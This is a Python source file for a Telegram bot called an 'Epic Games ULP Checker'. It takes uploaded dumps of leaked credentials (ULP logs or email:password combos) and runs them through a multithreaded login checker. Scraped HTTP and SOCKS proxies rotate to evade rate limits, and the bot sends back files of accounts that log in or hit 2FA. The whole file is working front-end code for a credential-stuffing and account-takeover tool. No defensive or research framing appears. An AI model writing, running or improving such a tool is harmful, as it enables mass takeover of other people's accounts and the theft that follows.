"""
bot.py — Telegram bot handlers
"""
import asyncio
import io
import threading
import time

from telegram import Update, Document
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters,
)

from config     import BOT_TOKEN, THREADS, MAX_RETRIES
from parser     import parse_ulp
from engine     import run_check, BUSY
from proxy_pool import pool as proxy_pool
from scraper    import scrape as scrape_proxies


# ── /start & /help ────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎮 *Epic Games ULP Checker*\n\n"
        "Drop any `.txt` file — ULP or plain `email:pass` combos.\n"
        "Bot finds Epic Games accounts and checks if they log in.\n\n"
        "Results:\n"
        "✅ HIT  — logged in\n"
        "🔐 2FA  — login blocked by 2FA\n"
        "❌ BAD  — wrong password\n"
        "💀 DEAD — account not found\n\n"
        "Commands:\n"
        "`/scrapeproxy` — auto-scrape HTTP+SOCKS4+SOCKS5 from GitHub\n"
        "`/proxy` — load proxy list (send `.txt` after command)\n"
        "`/proxies` — show proxy count\n"
        "`/clearproxy` — remove all proxies\n\n"
        "Just send the combo file, no other commands needed.",
        parse_mode="Markdown",
    )


# ── /proxy — load proxies from a .txt file ───────────────────────────────────

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📡 Send me a `.txt` file with one proxy per line.\n\n"
        "Formats accepted:\n"
        "`ip:port`\n"
        "`ip:port:user:pass`\n"
        "`http://user:pass@ip:port`",
        parse_mode="Markdown",
    )
    # set a flag so the next document from this user is treated as a proxy file
    ctx.user_data["awaiting_proxy"] = True


async def cmd_proxies(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    n = proxy_pool.count
    if n:
        await update.message.reply_text(f"📡 `{n}` proxies loaded (round-robin).", parse_mode="Markdown")
    else:
        await update.message.reply_text("📡 No proxies loaded — running direct.")


async def cmd_clear_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    proxy_pool.clear()
    await update.message.reply_text("🗑 Proxy list cleared.")


# ── /scrapeproxy — pull fresh proxies from GitHub ────────────────────────────

async def cmd_scrape_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    loop       = asyncio.get_event_loop()
    status_msg = await update.message.reply_text(
        "🔍 Scraping proxies from GitHub...\n"
        "HTTP · SOCKS4 · SOCKS5 — this takes ~15s"
    )

    def _progress(msg: str):
        async def _edit():
            try:
                cur = status_msg.text or ""
                await status_msg.edit_text(cur + f"\n{msg}")
            except Exception:
                pass
        asyncio.run_coroutine_threadsafe(_edit(), loop)

    def _run():
        proxies, counts = scrape_proxies(progress_cb=_progress)
        # load into pool (replaces existing list)
        proxy_pool.load(proxies)

        total = sum(counts.values())
        summary = (
            f"📡 *Proxy scrape complete!*\n\n"
            f"🌐 HTTP:   `{counts.get('http',   0)}`\n"
            f"🔵 SOCKS4: `{counts.get('socks4', 0)}`\n"
            f"🟣 SOCKS5: `{counts.get('socks5', 0)}`\n\n"
            f"✅ *Total loaded: `{total}`* (deduped, ready to use)"
        )

        async def _done():
            try:
                await status_msg.edit_text(summary, parse_mode="Markdown")
            except Exception:
                await update.message.reply_text(summary, parse_mode="Markdown")
        asyncio.run_coroutine_threadsafe(_done(), loop)

    threading.Thread(target=_run, daemon=True).start()



# ── file handler — combo file OR proxy file ───────────────────────────────────

async def handle_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    msg  = update.message
    loop = asyncio.get_event_loop()
    doc: Document = msg.document

    if not doc.file_name.endswith(".txt"):
        await msg.reply_text("Send a `.txt` file.")
        return

    # download
    status_msg = await msg.reply_text("📥 Downloading...")
    file       = await doc.get_file()
    buf        = await file.download_as_bytearray()
    text       = buf.decode("utf-8", errors="replace")
    lines      = [l for l in text.splitlines() if l.strip()]

    # ── proxy file? ───────────────────────────────────────────────────────────
    if ctx.user_data.get("awaiting_proxy"):
        ctx.user_data["awaiting_proxy"] = False
        n = proxy_pool.load(lines)
        await status_msg.edit_text(f"📡 Loaded `{n}` proxies. Ready to check.", parse_mode="Markdown")
        return

    # ── combo file ────────────────────────────────────────────────────────────
    if uid in BUSY:
        await status_msg.edit_text("⏳ Already running a check. Wait for it to finish.")
        return

    combos     = parse_ulp(text, epic_only=True)
    epic_found = len(combos)

    if not combos:
        combos = parse_ulp(text, epic_only=False)
        if not combos:
            await status_msg.edit_text("❌ No valid `email:password` combos found in file.")
            return
        note = f"⚠️ No Epic domain tags found — checking all {len(combos)} combos."
    else:
        note = f"🎯 Found {epic_found} Epic Games entries."

    proxy_note = f"📡 `{proxy_pool.count}` proxies" if proxy_pool.count else "🌐 Direct (no proxy)"
    await status_msg.edit_text(
        f"{note}\n{proxy_note}\n"
        f"🚀 Starting — `{THREADS}` threads | `{MAX_RETRIES}` retry passes\n\n"
        f"Total: `{len(combos)}`",
        parse_mode="Markdown",
    )

    BUSY.add(uid)
    start = time.time()

    # ── progress callback ─────────────────────────────────────────────────────
    last_edit = [0.0]
    def progress(checked: int, total: int, stats: dict):
        now = time.time()
        if now - last_edit[0] < 2.0 and checked < total:
            return
        last_edit[0] = now
        elapsed = now - start
        cpm     = int(checked / elapsed * 60) if elapsed > 1 else 0
        txt     = (
            f"🔄 `{checked}/{total}` checked  |  `{cpm}` cpm\n"
            f"✅ HIT: `{stats.get('HIT',0)}`  "
            f"🔐 2FA: `{stats.get('2FA',0)}`  "
            f"❌ BAD: `{stats.get('BAD',0)}`  "
            f"💀 DEAD: `{stats.get('DEAD',0)}`  "
            f"🔁 RETRY: `{stats.get('RETRY',0)}`"
        )
        async def _edit():
            try:
                await status_msg.edit_text(txt, parse_mode="Markdown")
            except Exception:
                pass
        asyncio.run_coroutine_threadsafe(_edit(), loop)

    # ── done callback ─────────────────────────────────────────────────────────
    def done(results: dict):
        BUSY.discard(uid)
        elapsed = time.time() - start

        async def _finish():
            hits   = results.get("HIT",   [])
            tfa    = results.get("2FA",   [])
            bad    = results.get("BAD",   [])
            dead   = results.get("DEAD",  [])
            errors = results.get("ERROR", [])
            retry  = results.get("RETRY", [])

            summary = (
                f"✅ *Check complete* in `{elapsed:.1f}s`\n\n"
                f"✅ HIT:   `{len(hits)}`\n"
                f"🔐 2FA:   `{len(tfa)}`\n"
                f"❌ BAD:   `{len(bad)}`\n"
                f"💀 DEAD:  `{len(dead)}`\n"
                f"⚠️ ERROR: `{len(errors)}`\n"
                f"🔁 RETRY: `{len(retry)}` _(throttled, still unsolved)_"
            )
            await msg.reply_text(summary, parse_mode="Markdown")

            if hits:
                hit_buf      = io.BytesIO("\n".join(hits).encode())
                hit_buf.name = "HITS.txt"
                await msg.reply_document(hit_buf, caption=f"✅ {len(hits)} HITS")

            if tfa:
                tfa_buf      = io.BytesIO("\n".join(tfa).encode())
                tfa_buf.name = "2FA.txt"
                await msg.reply_document(tfa_buf, caption=f"🔐 {len(tfa)} 2FA")

            if retry:
                retry_buf      = io.BytesIO("\n".join(retry).encode())
                retry_buf.name = "RETRY.txt"
                await msg.reply_document(retry_buf, caption=f"🔁 {len(retry)} throttled — retry later or use proxies")

            if not hits and not tfa:
                await msg.reply_text("💀 No hits or 2FA accounts found.")

        asyncio.run_coroutine_threadsafe(_finish(), loop)

    # launch checker
    threading.Thread(
        target=run_check,
        args=(combos, progress, done),
        daemon=True,
    ).start()


# ── app builder ───────────────────────────────────────────────────────────────

def build_app() -> Application:
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",        cmd_start))
    app.add_handler(CommandHandler("help",         cmd_start))
    app.add_handler(CommandHandler("proxy",        cmd_proxy))
    app.add_handler(CommandHandler("proxies",      cmd_proxies))
    app.add_handler(CommandHandler("clearproxy",   cmd_clear_proxy))
    app.add_handler(CommandHandler("scrapeproxy",  cmd_scrape_proxy))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_file))
    return app
